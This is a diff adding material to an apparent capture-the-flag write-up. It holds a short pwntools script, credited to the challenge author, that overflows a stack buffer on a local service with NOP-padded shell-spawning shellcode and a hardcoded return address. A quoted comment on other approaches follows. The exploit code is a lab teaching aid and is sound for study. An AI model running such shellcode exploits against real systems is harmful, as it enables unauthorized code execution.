@@ -113,3 +113,25 @@ with open('payload', 'wb') as f:
 sh.send(payload)
 sh.interactive() # Hit enter to show the output of `cat /flag.txt`
 ```
+
+---
+
+Better solution from the author:
+
+```python
+from pwn import *
+
+r = remote('localhost', 1990)
+context(arch='amd64')
+
+r.recvline()
+pl = asm('sub rsp, 0x100;' + shellcraft.sh()).rjust(0x78, asm('nop'))
+r.sendline(pl.hex() + p64(0x7fffffffe720).hex())
+r.interactive()
+```
+
+He also said:
+
+> better solution would be to make use of the provided docker (compile debug
+> functionality of stack location into the binary and build container) or jump
+> directly into the output function, as someone else noted.
